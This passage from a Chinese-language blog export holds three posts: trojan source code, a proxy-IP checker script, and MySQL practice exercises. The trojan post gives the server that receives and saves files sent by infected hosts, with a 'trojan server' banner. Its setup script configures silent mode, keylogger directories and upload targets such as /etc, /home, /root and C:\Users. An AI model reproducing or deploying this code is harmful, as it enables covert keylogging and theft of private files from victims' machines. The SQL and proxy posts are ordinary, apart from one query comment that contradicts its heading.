class="keyword">from</span> scan_dir(fullpath)  <span class="comment"># Python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(split_path(<span class="string">&#x27;/home/trojan/source_code/server.py&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="comment"># print(sys.path)</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> inout <span class="keyword">import</span> InOutException</span><br><span class="line"><span class="keyword">from</span> netapi <span class="keyword">import</span> NetAPI, save_file</span><br><span class="line"></span><br><span class="line"><span class="comment"># from kk import inout</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### change banner here ###</span></span><br><span class="line">BANNER = <span class="string">b&#x27;7RJN0001 7r0j4n 53rv3r v.0.1 r313453\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;********************************\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;*** W31c0m3 70 53nd m3 f!135 ***\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;********************************\r\n&#x27;</span></span><br><span class="line"><span class="comment">##########################</span></span><br><span class="line"></span><br><span class="line">MAX_CONN = <span class="number">10</span></span><br><span class="line">target_dir = save_dir.get(platform.system())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_thread</span>(<span class="params">conn, addr, path</span>):</span></span><br><span class="line">    handler = NetAPI(conn)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;start recv_file()&#x27;</span>)</span><br><span class="line">            data = handler.recv_file()</span><br><span class="line">            logging.debug(<span class="string">&#x27;return from recv_file()&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                logging.debug(<span class="string">&#x27;receive_thread: no data, break&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;verify data&#x27;</span>)</span><br><span class="line">            data = handler.recv_verify(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                logging.debug(<span class="string">&#x27;data imcomplete&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            filename = os.path.join(path, addr[<span class="number">0</span>])</span><br><span class="line">            logging.debug(<span class="string">&#x27;save to %s&#x27;</span>, filename)</span><br><span class="line">            save_file(data, filename)</span><br><span class="line">        <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception %s&#x27;</span>, e.args)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception %s, break&#x27;</span>, e.args)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception: %s, break&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    logging.debug(<span class="string">&#x27;close connection&#x27;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line"><span class="comment"># server start #</span></span><br><span class="line"><span class="comment">################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_start</span>(<span class="params">addr</span>):</span></span><br><span class="line">    thread_flag = <span class="literal">True</span>  <span class="comment"># False if debugging</span></span><br><span class="line">    threads = []</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.bind(addr)</span><br><span class="line">    serverSocket.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = serverSocket.accept()</span><br><span class="line">        logging.debug(<span class="string">&#x27;send banner&#x27;</span>)</span><br><span class="line">        conn.send(BANNER + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> thread_flag:</span><br><span class="line">            <span class="comment"># thread</span></span><br><span class="line">            threads = thread_refresh(threads)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(threads) &lt; MAX_CONN:</span><br><span class="line">                thread = threading.Thread(target=receive_thread, \</span><br><span class="line">                                          args=(conn, addr, target_dir,))</span><br><span class="line">                thread.start()</span><br><span class="line">                threads.append(thread)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            receive_thread(conn, addr, target_dir)</span><br><span class="line">    serverSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_start((<span class="string">&#x27;&#x27;</span>, PORT,))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">sys.path.insert(<span class="number">0</span>,os.path.join(BASE_DIR,<span class="string">&#x27;00网络编程&#x27;</span>))</span><br><span class="line"><span class="keyword">from</span> kk <span class="keyword">import</span> myip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_config</span>(<span class="params">fileName, parameters</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fileName, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        maxlen = <span class="built_in">max</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> parameters.keys()])</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> parameters.items():</span><br><span class="line">            fp.write(<span class="string">&#x27;%s = %s\n&#x27;</span> % (key.ljust(maxlen), <span class="built_in">str</span>(value)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parameters = &#123;</span><br><span class="line">            <span class="string">&#x27;MAX_BANNER_LEN&#x27;</span>:  <span class="number">1024</span>,</span><br><span class="line">            <span class="string">&#x27;SILENT_MODE&#x27;</span>:     <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;SERVERS&#x27;</span>:         [myip.myip_wan(), myip.myip_lan()],</span><br><span class="line">            <span class="string">&#x27;PORT&#x27;</span>:            <span class="number">50006</span>,</span><br><span class="line">            <span class="string">&#x27;trojan_dirs&#x27;</span>:     &#123; <span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\Trojan&#x27;</span>,</span><br><span class="line">                                 <span class="string">&#x27;Linux&#x27;</span>:   <span class="string">&#x27;/tmp&#x27;</span>, &#125;,</span><br><span class="line">            <span class="string">&#x27;keylogger_dirs&#x27;</span>:  &#123; <span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\KeyLogger&#x27;</span>], &#125;,</span><br><span class="line">            <span class="string">&#x27;upload_dirs&#x27;</span>:     &#123; <span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\Users&#x27;</span>, <span class="string">&#x27;D:&#x27;</span>, <span class="string">&#x27;E:&#x27;</span>, <span class="string">&#x27;F:&#x27;</span>],</span><br><span class="line">                                 <span class="string">&#x27;Linux&#x27;</span>:   [<span class="string">&#x27;/etc&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;/root&#x27;</span>],&#125;,</span><br><span class="line">            <span class="string">&#x27;max_size&#x27;</span>:        <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>,</span><br><span class="line">            <span class="string">&#x27;max_file&#x27;</span>:        <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;update_interval&#x27;</span>: <span class="number">60</span> * <span class="number">60</span>,   <span class="comment"># seconds</span></span><br><span class="line">            <span class="string">&#x27;keylog_interval&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">&#x27;save_dir&#x27;</span>:        &#123;<span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\temp&#x27;</span>,</span><br><span class="line">                                <span class="string">&#x27;Linux&#x27;</span>:   <span class="string">&#x27;/tmp&#x27;</span>, &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    dirName  = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    fileName = os.path.join(dirName, <span class="string">&#x27;config.py&#x27;</span>)</span><br><span class="line">    build_config(fileName, parameters)</span><br><span class="line"></span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>网络编程</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>spider_ip代理 - 验证</title>
    <url>//spider_ip%E4%BB%A3%E7%90%86%20-%20%E9%AA%8C%E8%AF%81</url>
    <content><![CDATA[<h1 id="spider-ip代理-验证"><a href="#spider-ip代理-验证" class="headerlink" title="spider_ip代理 - 验证"></a>spider_ip代理 - 验证</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ip代理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_proxy</span>():</span></span><br><span class="line">    <span class="comment"># 代理商提供的api</span></span><br><span class="line">    url = <span class="string">&quot;http://proxy.httpdaili.com/apinew.asp?ddbh=1454554059906534893&quot;</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;代理ip状态码：&quot;</span>, r.status_code)</span><br><span class="line">    t = r.text</span><br><span class="line">    <span class="comment"># 正则匹配ip段and端口号</span></span><br><span class="line">    ips = re.findall(<span class="string">r&#x27;[0-9]+(?:\.[0-9])+.+[0-9]&#123;3&#125;&#x27;</span>, t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;当前代理ip地有：&quot;</span>, ips)</span><br><span class="line">    <span class="comment"># proxy = &#123;&#x27;http&#x27;: ips[0]&#125;</span></span><br><span class="line">    <span class="comment"># print(&quot;当前代理ip地址为：&quot;,proxy)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ips</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip_data</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://tool.lu/ip/&#x27;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 代理ip</span></span><br><span class="line">        ip = ip_proxy()</span><br><span class="line">        ipp = &#123;</span><br><span class="line">            <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + ip[random.randint(<span class="number">0</span>, <span class="number">1</span>)]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(ipp)</span><br><span class="line"></span><br><span class="line">        req = requests.get(url, headers=headers, proxies=ipp, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 输出状态码</span></span><br><span class="line">        <span class="built_in">print</span>(req)</span><br><span class="line"></span><br><span class="line">        html_ip = etree.HTML(req.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 测试代理ip是否能用</span></span><br><span class="line">        data = html_ip.xpath(<span class="string">&#x27;//*[@id=&quot;main_form&quot;]/p[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>投篮</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL_demo_50道习题</title>
    <url>//MySQL_demo</url>
    <content><![CDATA[<h2 id="表名和字段"><a href="#表名和字段" class="headerlink" title="表名和字段"></a>表名和字段</h2><p>–1.学生表<br>Student(s_id,s_name,s_birth,s_sex) –学生编号,学生姓名, 出生年月,学生性别<br>–2.课程表<br>Course(c_id,c_name,t_id) – –课程编号, 课程名称, 教师编号<br>–3.教师表<br>Teacher(t_id,t_name) –教师编号,教师姓名<br>–4.成绩表<br>Score(s_id,c_id,s_score) –学生编号,课程编号,分数</p>
<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#–1.学生表 </span><br><span class="line">#Student(s_id,s_name,s_birth,s_sex) –学生编号,学生姓名, 出生年月,学生性别</span><br><span class="line">CREATE TABLE `Student` (</span><br><span class="line">    `s_id` VARCHAR(20),</span><br><span class="line">    s_name VARCHAR(20) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">    s_brith VARCHAR(20) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">    s_sex VARCHAR(10) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">    PRIMARY KEY(s_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">#–2.课程表 </span><br><span class="line">#Course(c_id,c_name,t_id) – –课程编号, 课程名称, 教师编号 </span><br><span class="line">create table Course(</span><br><span class="line">    c_id varchar(20),</span><br><span class="line">    c_name VARCHAR(20) not null DEFAULT &#x27;&#x27;,</span><br><span class="line">    t_id VARCHAR(20) NOT NULL,</span><br><span class="line">    PRIMARY KEY(c_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">–3.教师表 </span><br><span class="line">Teacher(t_id,t_name) –教师编号,教师姓名 </span><br><span class="line">*/</span><br><span class="line">CREATE TABLE Teacher(</span><br><span class="line">    t_id VARCHAR(20),</span><br><span class="line">    t_name VARCHAR(20) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">    PRIMARY KEY(t_id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">–4.成绩表 </span><br><span class="line">Score(s_id,c_id,s_score) –学生编号,课程编号,分数</span><br><span class="line">*/</span><br><span class="line">Create table Score(</span><br><span class="line">    s_id VARCHAR(20),</span><br><span class="line">    c_id VARCHAR(20) not null default &#x27;&#x27;,</span><br><span class="line">    s_score INT(3),</span><br><span class="line">    primary key(`s_id`,`c_id`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#--插入学生表测试数据</span><br><span class="line">#(&#x27;01&#x27; , &#x27;赵雷&#x27; , &#x27;1990-01-01&#x27; , &#x27;男&#x27;)</span><br><span class="line">insert into Student values(&#x27;01&#x27; , &#x27;赵雷&#x27; , &#x27;1990-01-01&#x27; , &#x27;男&#x27;);</span><br><span class="line">insert into Student values(&#x27;02&#x27; , &#x27;钱电&#x27; , &#x27;1990-12-21&#x27; , &#x27;男&#x27;);</span><br><span class="line">insert into Student values(&#x27;03&#x27; , &#x27;孙风&#x27; , &#x27;1990-05-20&#x27; , &#x27;男&#x27;);</span><br><span class="line">insert into Student values(&#x27;04&#x27; , &#x27;李云&#x27; , &#x27;1990-08-06&#x27; , &#x27;男&#x27;);</span><br><span class="line">insert into Student values(&#x27;05&#x27; , &#x27;周梅&#x27; , &#x27;1991-12-01&#x27; , &#x27;女&#x27;);</span><br><span class="line">insert into Student values(&#x27;06&#x27; , &#x27;吴兰&#x27; , &#x27;1992-03-01&#x27; , &#x27;女&#x27;);</span><br><span class="line">insert into Student values(&#x27;07&#x27; , &#x27;郑竹&#x27; , &#x27;1989-07-01&#x27; , &#x27;女&#x27;);</span><br><span class="line">insert into Student values(&#x27;08&#x27; , &#x27;王菊&#x27; , &#x27;1990-01-20&#x27; , &#x27;女&#x27;);</span><br><span class="line"></span><br><span class="line">#--课程表测试数据</span><br><span class="line">insert into Course values(&#x27;01&#x27; , &#x27;语文&#x27; , &#x27;02&#x27;);</span><br><span class="line">insert into Course values(&#x27;02&#x27; , &#x27;数学&#x27; , &#x27;01&#x27;);</span><br><span class="line">insert into Course values(&#x27;03&#x27; , &#x27;英语&#x27; , &#x27;03&#x27;);</span><br><span class="line"></span><br><span class="line">#--教师表测试数据</span><br><span class="line">insert into Teacher values(&#x27;01&#x27; , &#x27;张三&#x27;);</span><br><span class="line">insert into Teacher values(&#x27;02&#x27; , &#x27;李四&#x27;);</span><br><span class="line">insert into Teacher values(&#x27;03&#x27; , &#x27;王五&#x27;);</span><br><span class="line"></span><br><span class="line">#--成绩表测试数据</span><br><span class="line">insert into Score values(&#x27;01&#x27; , &#x27;01&#x27; , 80);</span><br><span class="line">insert into Score values(&#x27;01&#x27; , &#x27;02&#x27; , 90);</span><br><span class="line">insert into Score values(&#x27;01&#x27; , &#x27;03&#x27; , 99);</span><br><span class="line">insert into Score values(&#x27;02&#x27; , &#x27;01&#x27; , 70);</span><br><span class="line">insert into Score values(&#x27;02&#x27; , &#x27;02&#x27; , 60);</span><br><span class="line">insert into Score values(&#x27;02&#x27; , &#x27;03&#x27; , 80);</span><br><span class="line">insert into Score values(&#x27;03&#x27; , &#x27;01&#x27; , 80);</span><br><span class="line">insert into Score values(&#x27;03&#x27; , &#x27;02&#x27; , 80);</span><br><span class="line">insert into Score values(&#x27;03&#x27; , &#x27;03&#x27; , 80);</span><br><span class="line">insert into Score values(&#x27;04&#x27; , &#x27;01&#x27; , 50);</span><br><span class="line">insert into Score values(&#x27;04&#x27; , &#x27;02&#x27; , 30);</span><br><span class="line">insert into Score values(&#x27;04&#x27; , &#x27;03&#x27; , 20);</span><br><span class="line">insert into Score values(&#x27;05&#x27; , &#x27;01&#x27; , 76);</span><br><span class="line">insert into Score values(&#x27;05&#x27; , &#x27;02&#x27; , 87);</span><br><span class="line">insert into Score values(&#x27;06&#x27; , &#x27;01&#x27; , 31);</span><br><span class="line">insert into Score values(&#x27;06&#x27; , &#x27;03&#x27; , 34);</span><br><span class="line">insert into Score values(&#x27;07&#x27; , &#x27;02&#x27; , 89);</span><br><span class="line">insert into Score values(&#x27;07&#x27; , &#x27;03&#x27; , 98);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="练习题和sql语句"><a href="#练习题和sql语句" class="headerlink" title="练习题和sql语句"></a>练习题和sql语句</h2><h3 id="查询”01”课程比”02”课程成绩低的学生的信息及课程分数"><a href="#查询”01”课程比”02”课程成绩低的学生的信息及课程分数" class="headerlink" title="查询”01”课程比”02”课程成绩低的学生的信息及课程分数"></a>查询”01”课程比”02”课程成绩低的学生的信息及课程分数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 1、查询&quot;01&quot;课程比&quot;02&quot;课程成绩高的学生的信息及课程分数  </span><br><span class="line">select a.* ,b.s_score as 01_score,c.s_score as 02_score from </span><br><span class="line">    student a </span><br><span class="line">    join score b on a.s_id=b.s_id and b.c_id=&#x27;01&#x27;</span><br><span class="line">    left join score c on a.s_id=c.s_id and c.c_id=&#x27;02&#x27; or c.c_id = NULL where b.s_score&gt;c.s_score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 2、查询&quot;01&quot;课程比&quot;02&quot;课程成绩低的学生的信息及课程分数</span><br><span class="line">select a.* ,b.s_score as 01_score,c.s_score as 02_score from </span><br><span class="line">    student a left join score b on a.s_id=b.s_id and b.c_id=&#x27;01&#x27; or b.c_id=NULL </span><br><span class="line">     join score c on a.s_id=c.s_id and c.c_id=&#x27;02&#x27; where b.s_score&lt;c.s_score</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 3、查询平均成绩大于等于60分的同学的学生编号和学生姓名和平均成绩</span><br><span class="line">select b.s_id,b.s_name,ROUND(AVG(a.s_score),2) as avg_score from </span><br><span class="line">    student b </span><br><span class="line">    join score a on b.s_id = a.s_id</span><br><span class="line">    GROUP BY b.s_id,b.s_name HAVING ROUND(AVG(a.s_score),2)&gt;=60;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 4、查询平均成绩小于60分的同学的学生编号和学生姓名和平均成绩  -- (包括有成绩的和无成绩的)</span><br><span class="line">select b.s_id,b.s_name,ROUND(AVG(a.s_score),2) as avg_score from </span><br><span class="line">    student b </span><br><span class="line">    left join score a on b.s_id = a.s_id</span><br><span class="line">    GROUP BY b.s_id,b.s_name HAVING ROUND(AVG(a.s_score),2)&lt;60</span><br><span class="line">    union</span><br><span class="line">select a.s_id,a.s_name,0 as avg_score from </span><br><span class="line">    student a </span><br><span class="line">    where a.s_id not in (</span><br><span class="line">                select distinct s_id from score);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 5、查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩</span><br><span class="line">select a.s_id,a.s_name,count(b.c_id) as sum_course,sum(b.s_score) as sum_score from </span><br><span class="line">    student a </span><br><span class="line">    left join score b on a.s_id=b.s_id</span><br><span class="line">    GROUP BY a.s_id,a.s_name;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 6、查询&quot;李&quot;姓老师的数量 </span><br><span class="line">select count(t_id) from teacher where t_name like &#x27;李%&#x27;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">-- 7、查询学过&quot;张三&quot;老师授课的同学的信息 </span><br><span class="line">select a.* from </span><br><span class="line">    student a </span><br><span class="line">    join score b on a.s_id=b.s_id where b.c_id in(</span><br><span class="line">        select c_id from course where t_id =(</span><br><span class="line">            select t_id from teacher where t_name = &#x27;张三&#x27;));</span><br><span class="line">            </span><br><span class="line"> </span><br><span class="line">-- 8、查询没学过&quot;张三&quot;老师授课的同学的信息 </span><br><span class="line">select * from </span><br><span class="line">    student c </span><br><span class="line">    where c.s_id not in(</span><br><span class="line">        select a.s_id from student a join score b on a.s_id=b.s_id where b.c_id in(</span><br><span class="line">            select c_id from course where t_id =(</span><br><span class="line">                select t_id from teacher where t_name = &#x27;张三&#x27;)));</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">-- 9、查询学过编号为&quot;01&quot;并且也学过编号为&quot;02&quot;的课程的同学的信息</span><br><span class="line">select a.* from </span><br><span class="line">    student a,score b,score c </span><br><span class="line">    where a.s_id = b.s_id  and a.s_id = c.s_id and b.c_id=&#x27;01&#x27; and c.c_id=&#x27;02&#x27;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 10、查询学过编号为&quot;01&quot;但是没有学过编号为&quot;02&quot;的课程的同学的信息</span><br><span class="line">select a.* from </span><br><span class="line">    student a </span><br><span class="line">    where a.s_id in (select s_id from score where c_id=&#x27;01&#x27; ) and a.s_id not in(select s_id from score where c_id=&#x27;02&#x27;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">-- 11、查询没有学全所有课程的同学的信息 </span><br><span class="line">select s.* from </span><br><span class="line">    student s where s.s_id in(</span><br><span class="line">        select s_id from score where s_id not in(</span><br><span class="line">            select a.s_id from score a </span><br><span class="line">                join score b on a.s_id = b.s_id and b.c_id=&#x27;02&#x27;</span><br><span class="line">                join score c on a.s_id = c.s_id and c.c_id=&#x27;03&#x27;</span><br><span class="line">            where a.c_id=&#x27;01&#x27;))</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">-- 12、查询至少有一门课与学号为&quot;01&quot;的同学所学相同的同学的信息 </span><br><span class="line">select * from student where s_id in(</span><br><span class="line">    select distinct a.s_id from score a where a.c_id in(select a.c_id from score a where a.s_id=&#x27;01&#x27;)</span><br><span class="line">    );</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 13、查询和&quot;01&quot;号的同学学习的课程完全相同的其他同学的信息 </span><br><span class="line">select a.* from student a where a.s_id in(</span><br><span class="line">    select distinct s_id from score where s_id!=&#x27;01&#x27; and c_id in(select c_id from score where s_id=&#x27;01&#x27;)</span><br><span class="line">    group by s_id </span><br><span class="line">    having count(1)=(select count(1) from score where s_id=&#x27;01&#x27;));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">-- 14、查询没学过&quot;张三&quot;老师讲授的任一门课程的学生姓名 </span><br><span class="line">select a.s_name from student a where a.s_id not in (</span><br><span class="line">    select s_id from score where c_id = </span><br><span class="line">                (select c_id from course where t_id =(</span><br><span class="line">                    select t_id from teacher where t_name = &#x27;张三&#x27;)) </span><br><span class="line">                group by s_id);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 15、查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩 </span><br><span class="line">select a.s_id,a.s_name,ROUND(AVG(b.s_score)) from </span><br><span class="line">    student a </span><br><span class="line">    left join score b on a.s_id = b.s_id</span><br><span class="line">    where a.s_id in(</span><br><span class="line">            select s_id from score where s_score&lt;60 GROUP BY  s_id having count(1)&gt;=2)</span><br><span class="line">    GROUP BY a.s_id,a.s_name</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">-- 16、检索&quot;01&quot;课程分数小于60，按分数降序排列的学生信息</span><br><span class="line">select a.*,b.c_id,b.s_score from </span><br><span class="line">    student a,score b </span><br><span class="line">    where a.s_id = b.s_id and b.c_id=&#x27;01&#x27; and b.s_score&lt;60 ORDER BY b.s_score DESC;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 17、按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩</span><br><span class="line">select a.s_id,(select s_score from score where s_id=a.s_id and c_id=&#x27;01&#x27;) as 语文,</span><br><span class="line">                (select s_score from score where s_id=a.s_id and c_id=&#x27;02&#x27;) as 数学,</span><br><span class="line">                (select s_score from score where s_id=a.s_id and c_id=&#x27;03&#x27;) as 英语,</span><br><span class="line">            round(avg(s_score),2) as 平均分 from score a  GROUP BY a.s_id ORDER BY 平均分 DESC;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">-- 18.查询各科成绩最高分、最低分和平均分：以如下形式显示：课程ID，课程name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率</span><br><span class="line">--及格为&gt;=60，中等为：70-80，优良为：80-90，优秀为：&gt;=90</span><br><span class="line">select a.c_id,b.c_name,MAX(s_score),MIN(s_score),ROUND(AVG(s_score),2),</span><br><span class="line">    ROUND(100*(SUM(case when a.s_score&gt;=60 then 1 else 0 end)/SUM(case when a.s_score then 1 else 0 end)),2) as 及格率,</span><br><span class="line">    ROUND(100*(SUM(case when a.s_score&gt;=70 and a.s_score&lt;=80 then 1 else 0 end)/SUM(case when a.s_score then 1 else 0 end)),2) as 中等率,</span><br><span class="line">    ROUND(100*(SUM(case when a.s_score&gt;=80 and a.s_score&lt;=90 then 1 else 0 end)/SUM(case when a.s_score then 1 else 0 end)),2) as 优良率,</span><br><span class="line">    ROUND(100*(SUM(case when a.s_score&gt;=90 then 1 else 0 end)/SUM(case when a.s_score then 1 else 0 end)),2) as 优秀率</span><br><span class="line">    from score a left join course b on a.c_id = b.c_id GROUP BY a.c_id,b.c_name</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">-- 19、按各科成绩进行排序，并显示排名(实现不完全)</span><br><span class="line">-- mysql没有rank函数</span><br><span class="line">    select a.s_id,a.c_id,</span><br><span class="line">        @i:=@i +1 as i保留排名,</span><br><span class="line">        @k:=(case when @score=a.s_score then @k else @i end) as rank不保留排名,</span><br><span class="line">        @score:=a.s_score as score</span><br><span class="line">    from (</span><br><span class="line">        select s_id,c_id,s_score from score WHERE c_id=&#x27;01&#x27; GROUP BY s_id,c_id,s_score ORDER BY s_score DESC</span><br><span class="line">)a,(select @k:=0,@i:=0,@score:=0)s</span><br><span class="line">    union</span><br><span class="line">    select a.s_id,a.c_id,</span><br><span class="line">        @i:=@i +1 as i,</span><br><span class="line">        @k:=(case when @score=a.s_score then @k else @i end) as rank,</span><br><span class="line">        @score:=a.s_score as score</span><br><span class="line">    